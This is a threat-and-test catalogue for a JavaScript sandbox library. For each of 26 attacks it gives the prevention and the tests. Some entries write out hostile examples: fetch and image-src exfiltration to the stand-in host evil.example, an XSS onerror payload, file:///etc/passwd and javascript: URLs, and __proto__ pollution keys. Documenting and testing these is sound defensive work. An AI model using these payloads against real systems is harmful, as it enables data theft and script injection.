# icecream-sandbox: threats and tests

Every threat the library defends against, the attack it would take,
the mechanism that stops it, and the test that proves it. The formal
model (assets, actors, STRIDE, assumptions, residual risks) lives in
[threat-model.md](threat-model.md); the flows live in
[design.md](design.md). Run the security suite with
`npm run test:security` (unit attacks + browser attacks).

Test name references below are exact. Unit tests live in
`test/unit/` and `test/security/`; browser tests in `test/browser/`.

## Network

### T1. Guest code fetches data out directly

- **Attack:** `fetch("https://evil.example/?x=" + secret)` in guest code.
- **Prevention:** the guest realm contains no `fetch`,
  `XMLHttpRequest`, or `WebSocket` (nothing puts them there), and the
  worker CSP sets `connect-src 'none'`, so even a smuggled network
  call is blocked before it leaves.
- **Tests:** unit `guest globals probe` (all 15 network/DOM/storage
  globals missing); browser `guest sees no network, DOM, or storage
  globals`; browser security `fetch, XHR, and WebSocket attempts
  throw`; browser `sandboxed iframe network attempts are blocked and
  the canary sees zero requests`; browser security `attack attempts
  produce zero canary requests`.

### T2. Guest code rides the host's login (confused deputy fetch)

- **Attack:** guest triggers a host-side fetch that carries the host
  page's cookies to an attacker origin.
- **Prevention:** the only host-side fetch is the gate's, and it
  always uses `credentials: "omit"`. There is no other fetch path.
- **Tests:** unit `pre-allowed origins fetch without prompting`
  (asserts `credentials: "omit"` on the fetch init).

### T3. Redirect smuggles the request to an unapproved origin

- **Attack:** guest requests an approved origin that 302-redirects to
  `https://evil.example/`.
- **Prevention:** the gate never follows redirects. In browsers a
  redirect's destination is invisible (opaque-redirect, status 0), so
  following one would bypass the approval entirely. The gate rejects
  any redirect response and tells the guest to request the final URL.
- **Tests:** unit `a redirect response is rejected, never followed`
  (one fetch, one prompt, no hop fetched); unit `an opaque-redirect
  response (the browser's form) is rejected the same way`; browser
  `a redirect is rejected, never followed` (prompted once, target
  never fetched — canary log has no `/ping`).

### T4. Non-HTTP(S) URL schemes

- **Attack:** `host.fetchText("javascript:...")`,
  `"file:///etc/passwd"`, `"data:text/html,..."`.
- **Prevention:** the gate accepts absolute `http(s)` URLs only;
  anything else throws before any prompt or fetch.
- **Tests:** unit `rejects invalid and non-http(s) URLs before
  prompting`; unit security `javascript:, file:, and data: URLs are
  rejected before any prompt`; browser security `non-http(s) fetches
  are denied before any prompt` (zero prompts recorded).

### T5. Oversized or hanging responses

- **Attack:** an approved origin returns gigabytes, or stalls forever.
- **Prevention:** the gate streams the body with a
  `maxResponseBytes` cap (default 1 MiB) and a per-request timeout;
  the port's `maxInboundBytes` is a backstop.
- **Tests:** unit `oversized bodies are rejected`; unit `a hanging
  fetch hits the timeout`; browser `oversized responses are rejected`.

### T6. Guest reads the allowlist or the grants

- **Attack:** `host.getConnectionGrants()` or `host.allowedOrigins`
  to learn which origins the user trusts.
- **Prevention:** grants and the allowlist live on the host-side
  `Sandbox`/`ConnectionGate`. No guest API exposes them; the guest
  global has exactly `send`, `ask`, `fetchText`.
- **Tests:** browser `the guest cannot read the host-held allowlist
  or grants`; browser security `the guest cannot read the allowlist
  or the grants`.

### T7. Approval spoofing

- **Attack:** guest renders a fake approval dialog (or a fake "yes"
  button) to approve its own connection.
- **Prevention:** the library never renders approval UI. The
  `onConnectionRequest` callback runs in host-page UI by
  construction; the guest cannot influence it. (App responsibility to
  keep it there — see the threat model.)
- **Tests:** no direct test can prove a negative about app UI; the
  gate's callback contract is covered by unit `allow-once prompts on
  every request`, `allow-session prompts once, then grants the
  origin`, and `deny blocks the fetch`.

## DOM and rendering

### T8. Markup injection (XSS through guest trees)

- **Attack:** a tree child of `"<img src=x onerror=alert(1)>"`.
- **Prevention:** no `innerHTML` anywhere. Text children become text
  nodes, so a guest string can never become markup.
- **Tests:** browser security `markup strings stay text, never
  elements` (shadow HTML contains `&lt;img`, no `img` element).

### T9. Dangerous elements in guest trees

- **Attack:** trees of type `script`, `iframe`, `object`, `embed`,
  `form`, `style`, `link`, `meta`, or `base`.
- **Prevention:** a tag allowlist in `validateTree`, enforced before
  any DOM is built.
- **Tests:** unit `rejects disallowed tags`; browser security
  `script, iframe, form, and style trees are rejected before DOM`
  (shadow root stays empty).

### T10. CSS exfiltration (stylesheet and inline styles)

- **Attack:** a stylesheet with `@import` of a hostile sheet, or a
  `url()` that fetches with data in the query; an inline style
  object with a `url()` value.
- **Prevention:** `sanitizeCss` strips comments and `@import` and
  replaces `url()` with `none`; `sanitizeStyleValue` does the same
  for inline style object values. Styles apply only inside the
  guest's shadow root.
- **Tests:** unit `removes @import in url and string forms`,
  `replaces url() with none so no fetch can happen`; browser
  `CDN CSS flows through the gate, is sanitized, and styles the app`;
  browser security `style object url() values are neutralized`,
  `stylesheet traps are stripped in the real flow`.

### T11. Image exfiltration

- **Attack:** `<img src="https://evil.example/?x=...">` — the host
  page would fetch it, leaking data in the URL.
- **Prevention:** remote `src` values are dropped; only `data:` URLs
  are kept.
- **Tests:** browser security `remote image sources are dropped, so
  no request is made` (img element exists with no `src`, canary log
  empty).

### T12. Link attacks

- **Attack:** `javascript:` hrefs executing on click; `_blank` links
  leaking `window.opener`; links navigating the host page without
  approval.
- **Prevention:** `href` restricted to `http(s)`, `javascript:`
  dropped, `_blank` gets `rel="noopener"`. A link with an `onClick`
  id is a gated link: the click is preventDefaulted and reported as
  an event, so the host decides (approve and open, or ignore).
- **Tests:** browser security `javascript: hrefs are dropped, https
  hrefs are kept`; browser `a link with an onClick id does not
  navigate; the host decides` (event received, page URL unchanged).

### T13. Event handler injection

- **Attack:** an event prop whose value is a function, meant to run
  in host context.
- **Prevention:** event props must be string ids; the host maps ids
  to listeners. Functions cannot cross the JSON wire at all.
- **Tests:** unit `rejects malformed shapes` (non-string event prop
  throws).

### T14. Prototype pollution through trees and messages

- **Attack:** a prop or message key of `__proto__` with an object
  value, merged into a host object.
- **Prevention:** trees are never merged into host objects — fields
  are read one by one. Object-valued props are rejected by
  validation. JSON-parsed messages create own properties, not
  prototype mutations. The attribute-name lookup uses a
  `hasOwnProperty` guard (see "Bugs caught by this suite" below).
- **Tests:** unit security `JSON __proto__ keys in guest messages do
  not pollute the host`; unit security `prototype pollution stays
  inside the guest realm`; browser security `__proto__ props do not
  pollute the host`.

### T15. Tree bombs

- **Attack:** a tree nested 10,000 deep, or with a million nodes, to
  exhaust the host page building DOM.
- **Prevention:** depth 32 and 5000-node caps enforced in
  `validateTree` before any DOM is built.
- **Tests:** unit `rejects over-deep and over-large trees`.

## Host bridge and protocol

### T16. Host function abuse (ask allowlist bypass)

- **Attack:** `host.ask("unregistered", ...)` or `host.ask` with a
  non-string argument, or an ask handler returning a non-string.
- **Prevention:** names are an explicit allowlist; arguments are
  type-checked with `vm.typeof` before reading; non-string handler
  results are reported as errors, not delivered.
- **Tests:** unit security `unregistered ask names reject,
  including __proto__`; unit security `an ask handler returning a
  non-string is reported, not delivered`; unit `gated connections`
  tests for the fetchText equivalents.

### T17. Message flooding and oversized messages

- **Attack:** a guest flooding `host.send` with huge messages, or one
  message over the cap, to exhaust host memory.
- **Prevention:** per-message `maxMessageSize`, per-run
  `maxTotalOutputBytes`, per-code `maxCodeSize`, and port
  `maxInboundBytes` — each enforced on its own layer.
- **Tests:** unit security `host.send over maxMessageSize throws`,
  `total output cap stops a message flood`, `oversized code is
  rejected before running`; unit `gated connection abuse` 70 KiB URL
  test.

### T18. Malformed or forged port messages

- **Attack:** garbage JSON, wrong field types, unknown message types,
  or messages from the wrong source/nonce.
- **Prevention:** `decodeMessage` shape-checks everything and
  returns null for malformed input; callers ignore null. The iframe
  handshake verifies the nonce and first-source-wins.
- **Tests:** unit `rejects non-strings, bad JSON, and oversized
  input`, `rejects unknown types and wrong field types`, `round-trips
  the connection messages`; unit `garbage port messages are ignored
  and the next run still works`; browser `messages from the wrong
  source or with the wrong nonce are ignored`.

### T19. Runaway guests (loops, memory bombs, hangs)

- **Attack:** `while (true) {}`, unbounded string accumulation,
  a promise that never settles.
- **Prevention:** QuickJS interrupt handler (deadline), memory and
  stack caps, and the host watchdog at 1.5× deadline that kills the
  session and rebuilds on the next run. Known caveat: the memory
  limit does not charge string payload bytes (measured on
  quickjs-emscripten 0.32.0) — the deadline and watchdog are the
  backstop for string bombs, documented in the README.
- **Tests:** unit watchdog and string-bomb tests; browser `watchdog
  kills a hung worker and the next run rebuilds the session`;
  browser infinite-loop demo path.

### T20. State reuse after corruption or failure

- **Attack:** (not an attack so much as a hazard) reusing a runtime
  after an out-of-memory error, or a session after a watchdog kill.
- **Prevention:** fresh runtime per run, never reused after any
  error; failed sessions marked, ports closed, never reused; rebuild
  is lazy on the next `run()`. Session grants live on the `Sandbox`
  (not the session) so a rebuild does not re-prompt — intended, and
  revocable.
- **Tests:** unit `100 sequential runs leave no active run and no
  pending asks`; unit watchdog test asserting the failed session
  rejects further runs; browser watchdog rebuild test.

## Iframe and supply chain

### T21. Iframe escape via sandbox flags

- **Attack:** the iframe document reaching host-origin storage or
  cookies.
- **Prevention:** the sandbox attribute is hardcoded to
  `allow-scripts` only. There is no option to add
  `allow-same-origin`, and the documented fallback for a browser
  that cannot run blob workers in opaque iframes is a dedicated
  cross-site origin — never a weaker sandbox flag.
- **Tests:** browser `guest runs in a blob worker inside the
  opaque-origin iframe`; browser `sandboxed iframe network attempts
  are blocked` (canary zero-request proves the headers' effect).

### T22. Supply-chain compromise

- **Attack:** a dependency update that fetches code at runtime, or
  phones home.
- **Prevention:** two runtime dependencies, both pinned
  (`quickjs-emscripten-core@0.32.0`,
  `@jitl/quickjs-singlefile-cjs-release-sync@0.32.0`). The singlefile
  variant embeds its WASM as base64, so nothing is fetched at
  runtime. No telemetry anywhere.
- **Tests:** the browser suite's canary zero-request test proves no
  network happens during startup; `npm ci` in CI enforces the lock
  file.

## Module imports

### T23. Malicious imported module code

- **Attack:** a downloaded module that tries to escape the guest
  realm, read host state, or fetch on its own.
- **Prevention:** imported code runs inside the same guest realm
  under the same limits, with the same single `host` global. It has
  no DOM, storage, network, or host objects, and its only network
  path is the gate. Importing grants nothing.
- **Tests:** browser imports `imported module code has no more power
  than classic guest code` (a module guest probes host globals: all
  undefined, while the imported function works).

### T24. Import-map poisoning and guest-controlled specifiers

- **Attack:** guest code importing a specifier the app never
  approved, or rewriting the map to point a trusted name at an
  attacker URL.
- **Prevention:** the map is host-supplied per run and never crosses
  into the guest realm — the guest cannot read or change it. Bare
  specifiers resolve only through the map; an unmapped one fails the
  run naming the specifier. Map values must be absolute http(s)
  URLs, validated host-side before the run starts.
- **Tests:** unit `resolveSpecifier` (unmapped bare, non-http(s)
  schemes, relative-without-base); browser imports `unknown
  specifier fails naming the specifier`.

### T25. Cache poisoning and stale modules

- **Attack:** guest code planting a malicious module in the cache so
  a later import executes it, or a silently-updated module changing
  behavior under a trusted name.
- **Prevention:** the cache is host-side, keyed by resolved URL,
  written only by the host's own download path — the guest has no
  handle to it. Version pinning is the app's job: the map points at
  exact versions, and the library never re-resolves or updates
  anything on its own. The cache dies on `dispose()`.
- **Tests:** browser imports `second import is cached` (request
  counts prove the second import downloads nothing; `getImportCache`
  shows exactly the one URL).

### T26. Transitive import exfiltration (second-origin smuggling)

- **Attack:** a trusted module that imports from a second origin,
  riding the first origin's approval to fetch attacker code.
- **Prevention:** every hop is resolved and gated on its own origin.
  Relative hops inherit the importing module's origin (still subject
  to that origin's grant); absolute hops to a new origin need that
  origin's own approval. A grant never carries across origins, and
  redirects are rejected outright.
- **Tests:** browser imports `transitive relative imports resolve`
  (same-origin hop works) and `every transitive hop is gated on its
  own origin` (a cross-origin hop prompts a second time, for the
  second origin).

## Bugs caught by this suite

The security suite is not decorative — it has already caught real
bugs:

1. **Style object `url()` bypass (fixed).** Stylesheet text went
   through `sanitizeCss`, but inline style *objects* were assembled
   without sanitizing values — a `url()` there would have fetched
   from the host page. Fixed with `sanitizeStyleValue`, covered by
   browser security `style object url() values are neutralized`.
2. **Attribute-map prototype lookup (fixed).** `ATTR_MAP[key]` with a
   guest-controlled key of `__proto__` resolved to
   `Object.prototype` through the prototype chain, which
   `setAttribute` then rejected as `[object Object]`. Fixed with a
   `hasOwnProperty` guard in `attrName`, covered by browser security
   `__proto__ props do not pollute the host`.
3. **Redirect bypass by design (fixed before shipping).** The first
   gate design followed redirects with re-checks — until a browser
   test showed that browsers hide redirect destinations behind
   opaque-redirect responses, making re-checks impossible. The design
   changed to rejecting redirects outright, covered by unit and
   browser redirect tests.

If you add a guest-facing capability, add its attack test first.
